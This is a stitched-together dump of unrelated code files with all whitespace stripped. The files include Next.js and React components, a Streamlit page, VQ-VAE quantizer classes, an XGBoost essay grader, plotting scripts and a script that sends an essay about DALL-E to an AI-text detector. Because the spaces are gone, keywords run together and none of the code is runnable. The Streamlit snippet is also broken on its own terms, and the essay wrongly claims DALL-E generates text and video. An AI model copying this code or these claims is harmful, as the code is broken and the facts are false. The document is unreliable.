s://nextjs.org/learn?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"target="_blank"rel="noopenernoreferrer"><Imagearia-hiddensrc="https://nextjs.org/icons/file.svg"alt="Fileicon"width={16}height={16}/>Learn</a><aclassName="flexitems-centergap-2hover:underlinehover:underline-offset-4"href="https://vercel.com/templates?framework=next.js&utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"target="_blank"rel="noopenernoreferrer"><Imagearia-hiddensrc="https://nextjs.org/icons/window.svg"alt="Windowicon"width={16}height={16}/>Examples</a><aclassName="flexitems-centergap-2hover:underlinehover:underline-offset-4"href="https://nextjs.org?utm_source=create-next-app&utm_medium=appdir-template-tw&utm_campaign=create-next-app"target="_blank"rel="noopenernoreferrer"><Imagearia-hiddensrc="https://nextjs.org/icons/globe.svg"alt="Globeicon"width={16}height={16}/>Gotonextjs.org→</a></footer></div>);}importstreamlitasst#titlest.title('RavenAI')#textinputwithlabelsequence=st.text_input('EnterAminoAcidSequence')#windowslengthsliderlength=st.slider('WindowLength',1,10,3)#submitbuttonifst.button('Submit'):#runmodellocations=model.fit(sequence)locations=[['SFJKL',23],['FJKLS',43],['JKLSL',53],]#displaytablewithsequenceandprobabilityastheheadersst.table(locations)#colorcoderowsbasedonprobabilitycolor_code=lambdax:['background-color:red'ifx[1]>0.5else'background-color:green'foriinx]st.table(locations.style.applymap(color_code))defcolor_survived(x:float):#xbetween0and1#redtogreenscalebasedonx#0->red#0.5->clear#1->green#redifx<0.5:r=255g=int(255*(x/0.5))b=g#greenelse:r=int(255*((1-x)/0.5))g=255b=rreturnf'background-color:rgb({r},{g},{b})'importImagefrom'next/image';constLiveSessions=()=>{constliveStudySessions=[{id:1,title:'CalculusStudyGroup',host:'Alice',description:'Reviewingintegralsandderivatives',zoomLink:'https://zoom.us/calculus',},{id:2,title:'PhysicsStudySession',host:'Bob',description:"DiscussingNewton'slawsofmotion",zoomLink:'https://zoom.us/physics',},{id:3,title:'ChemistryStudyGroup',host:'Charlie',description:'Organicchemistryconcepts',zoomLink:'https://zoom.us/chemistry',},];return(<div><h2className='text-2xlfont-boldmb-4'>LiveStudySessions</h2><divclassName='gridgrid-cols-1md:grid-cols-2lg:grid-cols-3gap-4mb-8'>{liveStudySessions.length>0?(liveStudySessions.map((session)=>(<divkey={session.id}className='relativeborderp-4rounded-mdshadowtransformtransition-transformhover:shadow-lghover:bg-gray-100cursor-pointerduration-200ease-out'onClick={()=>window.open(session.zoomLink,'_blank')}><h3className='text-xlfont-semibold'>{session.title}</h3><pclassName='text-gray-600'>Hostedby:{session.host}</p><pclassName='text-gray-500'>{session.description}</p><divclassName='absolutebottom-2right-2'><Imagesrc='/live.png'alt='LiveIcon'width={24}height={24}/></div></div>))):(<p>Nolivestudysessionsavailableatthemoment.</p>)}</div></div>);};exportdefaultLiveSessions;importnumpyasnpimportmatplotlib.pyplotaspltINITIAL=20000WITHDRAW=10000R_LONG=0.1deffive_year_annual_growth_rate(initial:int,withdraw:int,r_long:float)->float:five_year_value=withdraw*(1+r_long)/r_longreturn(five_year_value/initial)**(1/5)-1if__name__=='__main__':#r_longfrom0.07to0.15#withdrawfrom5000to10000r_long=np.linspace(0.07,0.15,100)withdraw=np.linspace(5000,10000,100)#2Darraycalculatingfiveyearannualgrowthratebasedonr_longandwithdrawfive_year=np.array([[five_year_annual_growth_rate(INITIAL,w,r)forwinwithdraw]forrinr_long])plt.imshow(five_year,extent=[5000,10000,0.07,0.15],aspect='auto',origin='lower',cmap='RdYlGn_r')plt.colorbar()plt.xlabel('Withdraw')plt.ylabel('LongTermGrowthRate')plt.title('FiveYearAnnualGrowthRate')plt.show()const{logEvents}=require('./logger');consterrorHandler=(err,req,res,next)=>{logEvents(`${err.name}:${err.message}\t${req.method}\t${req.url}\t${req.headers.origin}`,'errLog.log');console.log(err.stack);conststatus=res.statusCode?res.statusCode:500;//servererrorres.status(status);res.json({message:err.message});};module.exports=errorHandler;importosimportpicklefromdotenvimportload_dotenvfrompydanticimportBaseModelfromopenaiimportOpenAIfromcontextimportcontextasCONTEXTfromprocess_slicesimportslices,ensure_length,ensure_end_on_period,ensure_start_at_beginningload_dotenv()api_key=os.getenv('OPENAI_API_KEY')SHORTEST=50LONGEST=100defget_prompt(words):output='\n'.join([f'{i}{word}'fori,wordinenumerate(words)])title='TheMartian'prompt=f'Pleaselookatthechapterbelowfrom"{title}"andsplitthetextupintosectionssuchthatanewimageisgeneratedforeachsectionandwillcollectivelycapturethemainvisualelementsofthewholechapter.Makesuretoendsectionsontheendofasentence.Eachsectionmustbebetween{SHORTEST}and{LONGEST}words.Outputalistofindiceslike[1,5,7,14...],wherethefirstsectioniswords1(inclusive)to5(exclusive):'returnprompt,outputclassSliceText(BaseModel):slices:list[int]defget_slices(words,api_key=api_key):client=OpenAI(api_key=api_key)prompt,output=get_prompt(words)completion=client.beta.chat.completions.parse(model='gpt-4o-mini',messages=[{'role':'system','content':CONTEXT},{'role':'user','content':prompt+'\n'+output}],response_format=SliceText)slices=ensure_start_at_beginning(ensure_end_on_period(words,ensure_length(completion.choices[0].message.parsed.slices)))withopen('slices.txt','w')asf:f.write(str(slices))returnslicesdefget_sections(words):slices=get_slices(words)return[''.join(paragraph)forparagraphin[words[slices[i-1]:slices[i]]foriinrange(1,len(slices))]]importunittestclassSolution:defthreeSum(self,nums:list[int])->set[tuple[int]]:if(len(nums)==3andnums[0]+nums[1]+nums[2]==0):return{(nums[0],nums[1],nums[2])}nums.sort()solutions=set()forfirstinrange(len(nums)-3):second=first+1third=len(nums)-1while(second<third):total=nums[second]+nums[third]target=-nums[first]if(total==target):solutions.add((nums[first],nums[second],nums[third]))if(second+1<third):if(nums[second+1]+nums[third]==target):solutions.add((nums[first],nums[second+1],nums[third]))elif(nums[second]+nums[third-1]==target):solutions.add((nums[first],nums[second],nums[third-1]))second+=1third-=1elif(total<target):second+=1else:#total>targetthird-=1returnsolutionsclassTestSolution(unittest.TestCase):defsetUp(self):self.solution=Solution()deftest_example_1(self):nums=[-1,0,1,2,-1,-4]self.assertEqual(self.solution.threeSum(nums),{(-1,0,1),(-1,-1,2)})deftest_example_2(self):nums=[0,1,1]self.assertEqual(self.solution.threeSum(nums),set())deftest_example_3(self):nums=[0,0,0]self.assertEqual(self.solution.threeSum(nums),{(0,0,0)})unittest.main()#print(Solution().threeSum([-1,0,1,2,-1,-4]))#print(Solution().threeSum([0,0,0]))fromapiimportApiapi=Api(base='https://openai-openai-detector.hf.space/',form='json')defvalidate(text:str)->int:api['']=textreturnapi.call()['real_probability']text="""DALL-Eisacutting-edgedeeplearningmodeldevelopedbyOpenAI,whichcanproduceawidevarietyoforiginalimages,texts,andvideosbycomprehendingnaturallanguageprompts.ThemodelisbasedontheGPT-3architectureandemploysatransformer-basedneuralnetworktograspthemeaningofagiventextpromptandgenerateappropriateoutputs.Withatransformer-basedarchitectureandtrainingonadiversedatasetofimages,texts,andvideos,DALL-Eiscapableofcreatingawiderangeofhigh-qualityoutputs.TheimpactofDALL-Eintheareasofnaturallanguageprocessing(NLP)andcomputervisionissignificant.Itsabilitytogenerateoriginalimages,texts,andvideosfromsimpletextpromptsmakesitavaluabletoolforcontentcreation,text-to-imagesynthesis,andtext-to-videosynthesis.Themodel'scapabilitytounderstandthemeaningoftextpromptsandgeneratecorrespondingoutputshascreatednewopportunitiesforNLP-basedapplicationssuchaschatbots,languagetranslation,andtextsummarization.Moreover,DALL-E'sabilitytogenerateimagesandvideosfromtextpromptshasvarioususefulapplicationslikecreatingmovieclips,musicvideos,andillustrations.However,DALL-EalsoraisesimportantethicalconcernsrelatedtotheimpactofAIoncreativeindustries,includingthepossibilityofAI-generatedcontentreplacinghuman-generatedcontentandtheimplicationsofAI-generatedcontentonintellectualpropertyrights.DespitethepromiseofDALL-E,itisstillinitsearlystagesandhasroomforimprovementsuchasunderstandingmorecomplextextprompts,generatingmorerealisticimagesandvideos,andmakingitmoreaccessibletoawiderrangeofusers.Overall,DALL-EisarevolutionarymodelthatdemonstratesthepotentialofAIinunderstandingandcreatingmultimediacontentandhasthepotentialtoshapethefutureofcontentcreation,entertainment,andmediaindustries.Additionally,itsimpactonartandgraphiccareers,intellectualproperty,andphilosophicalimplicationsneedtobeconsideredandaddressedbycreatingethicalframeworksandregulationsandeducatingsocietyontheresponsibleuseofthistechnologytoenhancehumanity.DALL-Ealsohasthepotentialtocreateseriousproblemsifnotusedresponsibly.Onemajorconcernisbias,asDALL-EandotherAImodelsmayonlybeasunbiasedasthedataitwastrainedon,ifthedatahasbias,themodelwillalsoreflectthat.Anotherconcernisprivacy,DALL-Eisabletounderstandnaturallanguagepromptsandgenerateoutputsbasedonthem,whichmeansthatitcouldpotentiallybeusedtogeneratesensitiveinformationsuchaspersonalinformationorconfidentialbusinessinformation.Additionally,DALL-EraiseslegalandregulatorychallengesrelatedtoauthorshipandownershipofAI-generatedcontentanditspotentialtoreplacehuman-generatedcontent.Furthermore,DALL-E'sabilitytogeneratetext,images,andvideoshasthepotentialtogenerateconvincingfakenews,deepfakes,orothermaliciouspurposes,creatingconfusionandmistrust.Finally,DALL-Ehasthepotentialtoleadtojobdisplacementincertainfieldssuchascontentcreation,graphicdesign,andwriting.It'simportanttoconsiderthepotentialnegativeimpactsofthistechnologyandtakestepstomitigatethem,suchascreatingethicalframeworksandregulations,raisingawareness,andeducatingsocietyontheresponsibleuseofthistechnologytoenhancehumanity.Addlater:POSITIVESAccessibility:DALL-E'sabilitytogeneratehigh-qualityimages,videos,andtextsbasedonsimpletextpromptscouldmakeartmoreaccessibletoawiderrangeofpeople,includingthosewhomaynothavehadaccesstotraditionalartforms.Creativity:DALL-Ecouldalsoenablenewformsofartanddesignthatwerenotpreviouslypossible,allowingforcollaborationbetweenhumansandAItocreatenew,excitingformsofart.Personalization:DALL-E'sabilitytounderstandnaturallanguagepromptsandgeneratecorrespondingoutputscouldalsomakeartmorepersonalandrelevanttoindividualusers,asitwouldbeabletocreateartbasedontheirspecificinterestsandpreferences.ETHICS/HUMANCREATIVITYThequestionsaboutthevalueandimportanceofhumancreativityandauthorshiparerelatedtotheethicalimplicationsofAI-generatedart.AsAImodelssuchasDALL-Ebecomemoreadvanced,thereisapossibilitythatAI-generatedartwillbecomeindistinguishablefromhuman-generatedart.Thisraisesimportantquestionsabouttheroleofhumancreativityintheartworld,andwhetherAI-generatedartshouldbeconsideredasvalidandvaluableasartcreatedbyhumans.Thequestionofauthorshipisalsocloselyrelatedtothis,asitisnotclearwhoshouldbeconsideredtheauthorofAI-generatedart.IsitthepersonwhocreatedtheAImodel,thepersonwhoprovidedthedataitwastrainedon,orthepersonwhoprovidedthetextpromptthatgeneratedtheoutput?Thesequestionshaveyettoberesolved,andtheywillrequirecarefulconsiderationastheuseofAI-generatedartbecomesmoreprevalent.Furthermore,theabilityofAItogenerateawiderangeofimages,texts,andvideos,raisesthequestionofauthenticityandoriginalityinart.Asartandcreativityarecloselyrelatedtotheideaofsomethingbeingunique,theabilitytoreproduceartinaninstantcouldchangehowartisviewed,perceived,andvalued.Inconclusion,AI-generatedartandthepossibilityofAI-generatedartreplacinghuman-generatedartraisesimportantquestionsabouttheroleofhumancreativity,authorship,originality,andauthenticityinart.It'simportanttoconsidertheseimplicationsandtoapproachthedevelopmentanduseofDALL-Einaresponsibleandethicalwaythatrespectsandpreservesthevalueofhumancreativityandauthorship."""print(str(validate(text)*100)+r'%real')importnltkCORPUS=''.join(nltk.corpus.brown.words())[:1000]#CORPUS=open('corpus/output.txt','r',encoding='utf-8').read()[:10000]fromkeyboardimportcolemak,qwerty,Layoutimportpickle#qwerty.set_fitness(CORPUS)#print(qwerty.fitness)#colemak.set_fitness(CORPUS)#print(colemak.fitness)withopen('keyboards/keyboard.pkl','rb')asf:keyboard=pickle.load(f)print(keyboard.translate('Thequickbrownfoxjumpsoverthelazydog.',colemak))importloggingfromabcimportabstractmethodfromtypingimportDict,Iterator,Literal,Optional,Tuple,Unionimportnumpyasnpimporttorchimporttorch.nnasnnimporttorch.nn.functionalasFfromeinopsimportrearrangefromtorchimporteinsumfrom.baseimportAbstractRegularizer,measure_perplexitylogpy=logging.getLogger(__name__)classAbstractQuantizer(AbstractRegularizer):def__init__(self):super().__init__()#Definetheseinyourinit#shape(N,)self.used:Optional[torch.Tensor]self.re_embed:intself.unknown_index:Union[Literal["random"],int]defremap_to_used(self,inds:torch.Tensor)->torch.Tensor:assertself.usedisnotNone,"Youneedtodefineusedindicesforremap"ishape=inds.shapeassertlen(ishape)>1inds=inds.reshape(ishape[0],-1)used=self.used.to(inds)match=(inds[:,:,None]==used[None,None,...]).long()new=match.argmax(-1)unknown=match.sum(2)<1ifself.unknown_index=="random":new[unknown]=torch.randint(0,self.re_embed,size=new[unknown].shape).to(device=new.device)else:new[unknown]=self.unknown_indexreturnnew.reshape(ishape)defunmap_to_all(self,inds:torch.Tensor)->torch.Tensor:assertself.usedisnotNone,"Youneedtodefineusedindicesforremap"ishape=inds.shapeassertlen(ishape)>1inds=inds.reshape(ishape[0],-1)used=self.used.to(inds)ifself.re_embed>self.used.shape[0]:#extratokeninds[inds>=self.used.shape[0]]=0#simplysettozeroback=torch.gather(used[None,:][inds.shape[0]*[0],:],1,inds)returnback.reshape(ishape)@abstractmethoddefget_codebook_entry(self,indices:torch.Tensor,shape:Optional[Tuple[int,...]]=None)->torch.Tensor:raiseNotImplementedError()defget_trainable_parameters(self)->Iterator[torch.nn.Parameter]:yieldfromself.parameters()classGumbelQuantizer(AbstractQuantizer):"""creditto@karpathy:https://github.com/karpathy/deep-vector-quantization/blob/main/model.py(thanks!)GumbelSoftmaxtrickquantizerCategoricalReparameterizationwithGumbel-Softmax,Jangetal.2016https://arxiv.org/abs/1611.01144"""def__init__(self,num_hiddens:int,embedding_dim:int,n_embed:int,straight_through:bool=True,kl_weight:float=5e-4,temp_init:float=1.0,remap:Optional[str]=None,unknown_index:str="random",loss_key:str="loss/vq",)->None:super().__init__()self.loss_key=loss_keyself.embedding_dim=embedding_dimself.n_embed=n_embedself.straight_through=straight_throughself.temperature=temp_initself.kl_weight=kl_weightself.proj=nn.Conv2d(num_hiddens,n_embed,1)self.embed=nn.Embedding(n_embed,embedding_dim)self.remap=remapifself.remapisnotNone:self.register_buffer("used",torch.tensor(np.load(self.remap)))self.re_embed=self.used.shape[0]else:self.used=Noneself.re_embed=n_embedifunknown_index=="extra":self.unknown_index=self.re_embedself.re_embed=self.re_embed+1else:assertunknown_index=="random"orisinstance(unknown_index,int),"unknownindexneedstobe'random','extra'oranyinteger"self.unknown_index=unknown_index#"random"or"extra"orintegerifself.remapisnotNone:logpy.info(f"Remapping{self.n_embed}indicesto{self.re_embed}indices."f"Using{self.unknown_index}forunknownindices.")defforward(self,z:torch.Tensor,temp:Optional[float]=None,return_logits:bool=False)->Tuple[torch.Tensor,Dict]:#forcehard=Truewhenweareinevalmode,aswemustquantize.#actually,alwaystrueseemstoworkhard=self.straight_throughifself.trainingelseTruetemp=self.temperatureiftempisNoneelsetempout_dict={}logits=self.proj(z)ifself.remapisnotNone:#continueonlywithusedlogitsfull_zeros=torch.zeros_like(logits)logits=logits[:,self.used,...]soft_one_hot=F.gumbel_softmax(logits,tau=temp,dim=1,hard=hard)ifself.remapisnotNone:#gobacktoallentriesbutunusedsettozerofull_zeros[:,self.used,...]=soft_one_hotsoft_one_hot=full_zerosz_q=einsum("bnhw,nd->bdhw",soft_one_hot,self.embed.weight)#+kldivergencetothepriorlossqy=F.softmax(logits,dim=1)diff=(self.kl_weight*torch.sum(qy*torch.log(qy*self.n_embed+1e-10),dim=1).mean())out_dict[self.loss_key]=diffind=soft_one_hot.argmax(dim=1)out_dict["indices"]=indifself.remapisnotNone:ind=self.remap_to_used(ind)ifreturn_logits:out_dict["logits"]=logitsreturnz_q,out_dictdefget_codebook_entry(self,indices,shape):#TODO:shapenotyetoptionalb,h,w,c=shapeassertb*h*w==indices.shape[0]indices=rearrange(indices,"(bhw)->bhw",b=b,h=h,w=w)ifself.remapisnotNone:indices=self.unmap_to_all(indices)one_hot=(F.one_hot(indices,num_classes=self.n_embed).permute(0,3,1,2).float())z_q=einsum("bnhw,nd->bdhw",one_hot,self.embed.weight)returnz_qclassVectorQuantizer(AbstractQuantizer):"""____________________________________________DiscretizationbottleneckpartoftheVQ-VAE.Inputs:-n_e:numberofembeddings-e_dim:dimensionofembedding-beta:commitmentcostusedinlossterm,beta*||z_e(x)-sg[e]||^2_____________________________________________"""def__init__(self,n_e:int,e_dim:int,beta:float=0.25,remap:Optional[str]=None,unknown_index:str="random",sane_index_shape:bool=False,log_perplexity:bool=False,embedding_weight_norm:bool=False,loss_key:str="loss/vq",):super().__init__()self.n_e=n_eself.e_dim=e_dimself.beta=betaself.loss_key=loss_keyifnotembedding_weight_norm:self.embedding=nn.Embedding(self.n_e,self.e_dim)self.embedding.weight.data.uniform_(-1.0/self.n_e,1.0/self.n_e)else:self.embedding=torch.nn.utils.weight_norm(nn.Embedding(self.n_e,self.e_dim),dim=1)self.remap=remapifself.remapisnotNone:self.register_buffer("used",torch.tensor(np.load(self.remap)))self.re_embed=self.used.shape[0]else:self.used=Noneself.re_embed=n_eifunknown_index=="extra":self.unknown_index=self.re_embedself.re_embed=self.re_embed+1else:assertunknown_index=="random"orisinstance(unknown_index,int),"unknownindexneedstobe'random','extra'oranyinteger"self.unknown_index=unknown_index#"random"or"extra"orintegerifself.remapisnotNone:logpy.info(f"Remapping{self.n_e}indicesto{self.re_embed}indices."f"Using{self.unknown_index}forunknownindices.")self.sane_index_shape=sane_index_shapeself.log_perplexity=log_perplexitydefforward(self,z:torch.Tensor,)->Tuple[torch.Tensor,Dict]:do_reshape=z.ndim==4ifdo_reshape:##reshapez->(batch,height,width,channel)andflattenz=rearrange(z,"bchw->bhwc").contiguous()else:assertz.ndim<4,"Noreshapingstrategyforinputs>4dimensionsdefined"z=z.contiguous()z_flattened=z.view(-1,self.e_dim)#distancesfromztoembeddingse_j(z-e)^2=z^2+e^2-2e*zd=(torch.sum(z_flattened**2,dim=1,keepdim=True)+torch.sum(self.embedding.weight**2,dim=1)-2*torch.einsum("bd,dn->bn",z_flattened,rearrange(self.embedding.weight,"nd->dn")))min_encoding_indices=torch.argmin(d,dim=1)z_q=self.embedding(min_encoding_indices).view(z.shape)loss_dict={}ifself.log_perplexity:perplexity,cluster_usage=measure_perplexity(min_encoding_indices.detach(),self.n_e)loss_dict.update({"perplexity":perplexity,"cluster_usage":cluster_usage})#computelossforembeddingloss=self.beta*torch.mean((z_q.detach()-z)**2)+torch.mean((z_q-z.detach())**2)loss_dict[self.loss_key]=loss#preservegradientsz_q=z+(z_q-z).detach()#reshapebacktomatchoriginalinputshapeifdo_reshape:z_q=rearrange(z_q,"bhwc->bchw").contiguous()ifself.remapisnotNone:min_encoding_indices=min_encoding_indices.reshape(z.shape[0],-1)#addbatchaxismin_encoding_indices=self.remap_to_used(min_encoding_indices)min_encoding_indices=min_encoding_indices.reshape(-1,1)#flattenifself.sane_index_shape:ifdo_reshape:min_encoding_indices=min_encoding_indices.reshape(z_q.shape[0],z_q.shape[2],z_q.shape[3])else:min_encoding_indices=rearrange(min_encoding_indices,"(bs)1->bs",b=z_q.shape[0])loss_dict["min_encoding_indices"]=min_encoding_indicesreturnz_q,loss_dictdefget_codebook_entry(self,indices:torch.Tensor,shape:Optional[Tuple[int,...]]=None)->torch.Tensor:#shapespecifying(batch,height,width,channel)ifself.remapisnotNone:assertshapeisnotNone,"Needtogiveshapeforremap"indices=indices.reshape(shape[0],-1)#addbatchaxisindices=self.unmap_to_all(indices)indices=indices.reshape(-1)#flattenagain#getquantizedlatentvectorsz_q=self.embedding(indices)ifshapeisnotNone:z_q=z_q.view(shape)#reshapebacktomatchoriginalinputshapez_q=z_q.permute(0,3,1,2).contiguous()returnz_qclassEmbeddingEMA(nn.Module):def__init__(self,num_tokens,codebook_dim,decay=0.99,eps=1e-5):super().__init__()self.decay=decayself.eps=epsweight=torch.randn(num_tokens,codebook_dim)self.weight=nn.Parameter(weight,requires_grad=False)self.cluster_size=nn.Parameter(torch.zeros(num_tokens),requires_grad=False)self.embed_avg=nn.Parameter(weight.clone(),requires_grad=False)self.update=Truedefforward(self,embed_id):returnF.embedding(embed_id,self.weight)defcluster_size_ema_update(self,new_cluster_size):self.cluster_size.data.mul_(self.decay).add_(new_cluster_size,alpha=1-self.decay)defembed_avg_ema_update(self,new_embed_avg):self.embed_avg.data.mul_(self.decay).add_(new_embed_avg,alpha=1-self.decay)defweight_update(self,num_tokens):n=self.cluster_size.sum()smoothed_cluster_size=((self.cluster_size+self.eps)/(n+num_tokens*self.eps)*n)#normalizeembeddingaveragewithsmoothedclustersizeembed_normalized=self.embed_avg/smoothed_cluster_size.unsqueeze(1)self.weight.data.copy_(embed_normalized)classEMAVectorQuantizer(AbstractQuantizer):def__init__(self,n_embed:int,embedding_dim:int,beta:float,decay:float=0.99,eps:float=1e-5,remap:Optional[str]=None,unknown_index:str="random",loss_key:str="loss/vq",):super().__init__()self.codebook_dim=embedding_dimself.num_tokens=n_embedself.beta=betaself.loss_key=loss_keyself.embedding=EmbeddingEMA(self.num_tokens,self.codebook_dim,decay,eps)self.remap=remapifself.remapisnotNone:self.register_buffer("used",torch.tensor(np.load(self.remap)))self.re_embed=self.used.shape[0]else:self.used=Noneself.re_embed=n_embedifunknown_index=="extra":self.unknown_index=self.re_embedself.re_embed=self.re_embed+1else:assertunknown_index=="random"orisinstance(unknown_index,int),"unknownindexneedstobe'random','extra'oranyinteger"self.unknown_index=unknown_index#"random"or"extra"orintegerifself.remapisnotNone:logpy.info(f"Remapping{self.n_embed}indicesto{self.re_embed}indices."f"Using{self.unknown_index}forunknownindices.")defforward(self,z:torch.Tensor)->Tuple[torch.Tensor,Dict]:#reshapez->(batch,height,width,channel)andflatten#z,'bchw->bhwc'z=rearrange(z,"bchw->bhwc")z_flattened=z.reshape(-1,self.codebook_dim)#distancesfromztoembeddingse_j(z-e)^2=z^2+e^2-2e*zd=(z_flattened.pow(2).sum(dim=1,keepdim=True)+self.embedding.weight.pow(2).sum(dim=1)-2*torch.einsum("bd,nd->bn",z_flattened,self.embedding.weight))#'nd->dn'encoding_indices=torch.argmin(d,dim=1)z_q=self.embedding(encoding_indices).view(z.shape)encodings=F.one_hot(encoding_indices,self.num_tokens).type(z.dtype)avg_probs=torch.mean(encodings,dim=0)perplexity=torch.exp(-torch.sum(avg_probs*torch.log(avg_probs+1e-10)))ifself.trainingandself.embedding.update:#EMAclustersizeencodings_sum=encodings.sum(0)self.embedding.cluster_size_ema_update(encodings_sum)#EMAembeddingaverageembed_sum=encodings.transpose(0,1)@z_flattenedself.embedding.embed_avg_ema_update(embed_sum)#normalizeembed_avgandupdateweightself.embedding.weight_update(self.num_tokens)#computelossforembeddingloss=self.beta*F.mse_loss(z_q.detach(),z)#preservegradientsz_q=z+(z_q-z).detach()#reshapebacktomatchoriginalinputshape#z_q,'bhwc->bchw'z_q=rearrange(z_q,"bhwc->bchw")out_dict={self.loss_key:loss,"encodings":encodings,"encoding_indices":encoding_indices,"perplexity":perplexity,}returnz_q,out_dictclassVectorQuantizerWithInputProjection(VectorQuantizer):def__init__(self,input_dim:int,n_codes:int,codebook_dim:int,beta:float=1.0,output_dim:Optional[int]=None,**kwargs,):super().__init__(n_codes,codebook_dim,beta,**kwargs)self.proj_in=nn.Linear(input_dim,codebook_dim)self.output_dim=output_dimifoutput_dimisnotNone:self.proj_out=nn.Linear(codebook_dim,output_dim)else:self.proj_out=nn.Identity()defforward(self,z:torch.Tensor)->Tuple[torch.Tensor,Dict]:rearr=Falsein_shape=z.shapeifz.ndim>3:rearr=self.output_dimisnotNonez=rearrange(z,"bc...->b(...)c")z=self.proj_in(z)z_q,loss_dict=super().forward(z)z_q=self.proj_out(z_q)ifrearr:iflen(in_shape)==4:z_q=rearrange(z_q,"b(hw)c->bchw",w=in_shape[-1])eliflen(in_shape)==5:z_q=rearrange(z_q,"b(thw)c->bcthw",w=in_shape[-1],h=in_shape[-2])else:raiseNotImplementedError(f"rearrangingnotavailablefor{len(in_shape)}-dimensionalinput.")returnz_q,loss_dictimportnumpyasnpimportmatplotlib.pyplotasplt#Definetheslopefunctiondefslope(x,y):return(x-1)/y#Createagridofxandyvaluesx=np.linspace(-10,10,20)y=np.linspace(-10,10,20)#CreateameshgridfromthexandyvaluesX,Y=np.meshgrid(x,y)#Calculatetheslope(dy/dx)ateachpointinthemeshgridU=1V=slope(X,Y)#NormalizethearrowsN=np.sqrt(U**2+V**2)U2,V2=U/N,V/N#Createtheplotplt.figure(figsize=(8,8))plt.quiver(X,Y,U2,V2,angles='xy')plt.xlim(-10,10)plt.ylim(-10,10)plt.xlabel('x')plt.ylabel('y')plt.title('Slopefieldfordy/dx=(x-1)/y')plt.grid(True)plt.show()#XGBoostimportpandasaspdimportnumpyasnpimportmatplotlib.pyplotaspltimportsklearnfromxgboostimportXGBRegressorfromsklearn.model_selectionimporttrain_test_splitfromsklearnimportpreprocessingimportpickle#importdataandsplitintosourcedependentandpersuasive/narrative/expositorydf=pd.read_feather('essaygrader/data/dataset.feather')source=df.loc[df['SourceDependentResponses']==1]pne=df.loc[df['Persuasive/Narrative/Expository']==1]#Sourcedependentsource_ms=source.loc[source['grade']==0]source_hs=source.loc[source['grade']==1]X=source_ms[['AverageWordLength','percent_misspelled','word_count','percent_key_words','sentcount','score','percent_stop_words']]y=source_ms['normalized_score']X_train,X_test,y_train,y_test=train_test_split(X,y,test_size=0.2,random_state=0)regressor_source_ms=XGBRegressor()regressor_source_ms.fit(X_train,y_train)r_sq=regressor_source_ms.score(X_test,y_test)print('score-SourceDependentResponses(MiddleSchool):',r_sq)#print('Coeffs:',regressor_source_ms.coef_)#-----X=source_hs[['AverageWordLength','percent_misspelled','word_count','percent_key_words','sentcount','score','percent_stop_words']]y=source_hs['normalized_score']X_train,X_test,y_train,y_test=train_test_split(X,y,test_size=0.2,random_state=0)regressor_source_hs=XGBRegressor()regressor_source_hs.fit(X_train,y_train)r_sq=regressor_source_hs.score(X_test,y_test)print('score-SourceDependentResponses(HighSchool):',r_sq)#print('Coeffs:',regressor_source_hs.coef_)#-----#persuasive/narrative/expositorypne_ms=pne.loc[pne['grade']==0]pne_hs=pne.loc[pne['grade']==1]X=pne_ms[['AverageWordLength','percent_misspelled','word_count','percent_key_words','sentcount','score','percent_stop_words']]y=pne_ms['normalized_score']X_train,X_test,y_train,y_test=train_test_split(X,y,test_size=0.2,random_state=0)regressor_pne_ms=XGBRegressor()regressor_pne_ms.fit(X_train,y_train)r_sq=regressor_pne_ms.score(X_test,y_test)print('score-Persuasive/Narrative/Expository(MiddleSchool):',r_sq)#print('Coeffs:',regressor_pne_ms.coef_)#-----X=pne_hs[['AverageWordLength','percent_misspelled','word_count','percent_key_words','sentcount','score','percent_stop_words']]y=pne_hs['normalized_score']X_train,X_test,y_train,y_test=train_test_split(X,y,test_size=0.2,random_state=0)regressor_pne_hs=XGBRegressor()regressor_pne_hs.fit(X_train,y_train)r_sq=regressor_pne_hs.score(X_test,y_test)print('score-Persuasive/Narrative/Expository(HighSchool):',r_sq)#print('Coeffs:',regressor_pne_hs.coef_)import{Comment}from'./Comment.js';exportconstCommentsPanel=({comments})=>{return(<divclassName='comments-panel'>{comments.map((comment)=>(<Commentcomment={comment}key={comment.id}/>))}</div>);};exportdefaultCommentsPanel;